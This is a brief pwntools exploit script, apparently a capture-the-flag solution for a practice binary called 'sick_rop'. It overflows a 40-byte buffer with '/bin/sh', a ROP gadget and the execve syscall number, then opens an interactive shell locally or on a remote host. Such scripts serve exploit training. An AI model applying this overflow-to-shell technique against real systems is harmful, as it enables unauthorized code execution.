#!/usr/bin/env python3

from pwn import *

def Main(socket=None):
    context.binary = "/home/vagrant/Downloads/sickrop/sick_rop"

    if not socket:
        proc = process()
        GDB(proc)

    else:
        ip, port = socket
        proc = remote(ip, int(port))


    func_read  = 0x401000
    func_write = 0x401017

    gadget_push_r10 = 0x401046 # push r10; call write

    vuln_overflow = 40

    buff = b"/bin/sh\x00"
    buff += b"i" * (vuln_overflow - len(buff))
    buff += p64(gadget_push_r10)
    buff += p64(0x3b) # write len, also execve syscall


    proc.write(buff)

    proc.interactive()




def GDB(proc):
    script = list()
    script.append("break *vuln+32")
    script.append("break *write+22")
    script.append("continue")
    script.append("")

    script = '\n'.join(script)

    gdb.attach(proc, script)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main((argv[1], argv[2]))

    else:
        Main()
